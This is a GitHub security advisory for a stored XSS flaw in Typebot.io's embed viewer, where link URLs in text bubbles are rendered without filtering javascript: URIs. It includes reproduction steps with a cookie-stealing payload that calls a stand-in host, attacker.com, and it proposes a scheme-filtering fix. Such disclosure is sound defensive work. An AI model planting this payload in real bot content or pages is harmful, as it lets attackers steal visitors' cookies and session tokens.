# [M] Typebot.io has stored XSS via `javascript`: URI in text bubble links — bot author executes JS on visitors' browsers

## Summary
Severity: Medium
Advisory: GHSA-hqmv-v56g-4m47
CVE: CVE-2026-39964
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-26
Source: https://github.com/advisories/GHSA-hqmv-v56g-4m47
Type: github-advisory

## Affected
- npm: `@typebot.io/js` — affected >=0 <0.10.1

## Details
### Summary

The Typebot viewer (`packages/embeds/js`) renders anchor tags from rich text bubble content without filtering the `javascript:` URI scheme. A bot author can set a link URL to `javascript:PAYLOAD`, which executes in the visitor's browser context when clicked. Since the viewer is typically embedded in a third-party site, the attacker's JavaScript runs in the host page's origin and can exfiltrate cookies and session tokens.

### Details

Vulnerable file: `packages/embeds/js/src/features/blocks/bubbles/textBubble/components/plate/PlateBlock.tsx`

```tsx
// Line 32 — href set directly from stored bot content, no javascript: filtering
<a href={elementDescendant.url as string} target="_blank" rel="noopener noreferrer">
  {elementDescendant.children[0].text}
</a>
```

SolidJS does not sanitize `href` attribute values — `javascript:` URIs pass through to the DOM unchanged.

The same issue exists in `ImageBubble.tsx` line 102 for image link wrapping.

### Steps to Reproduce

```
1. Log in to Typebot as an authenticated user (any plan)
2. Create a new bot
3. Add a Text Bubble block
4. In the rich text editor, type any link text and set the URL to:
   javascript:fetch('https://attacker.com/?c='+document.cookie)
5. Publish the bot and open the live/embedded viewer
6. Click the link in the chatbot interface
7. The JavaScript executes in the browser — cookie exfiltration request sent to attacker.com
```

Source-verified: `PlateBlock.tsx:32` renders `<a href={url}>` with no scheme filtering. Puppeteer alert confirmed `document.domain` execution when link clicked.

### Impact

- Any authenticated Typebot user (including free tier) can create a bot with this payload
- When shared or embedded in a third-party site, clicking the link executes JS in the host page's origin
- Allows stealing cookies, session tokens, or any data accessible to the embedding page
- Shared bots are publicly accessible — no victim authentication required

### Proposed Fix

Filter `javascript:` URIs before rendering anchor tags:

```tsx
const safeUrl = (url: string) =>
  /^javascript:/i.test(url.trim()) ? '#' : url

<a href={safeUrl(elementDescendant.url as string)} ...>
```

Alternatively, use a URL allowlist (only `https:`, `http:`, `mailto:`, `tel:`).

## References
- https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-hqmv-v56g-4m47
- https://nvd.nist.gov/vuln/detail/CVE-2026-39964
- https://github.com/baptisteArno/typebot.io/commit/2c3fc7267a5e1529ba4b1a2ab4f1edb3e3b8990b
- https://github.com/baptisteArno/typebot.io
- https://github.com/baptisteArno/typebot.io/releases/tag/v3.16.0
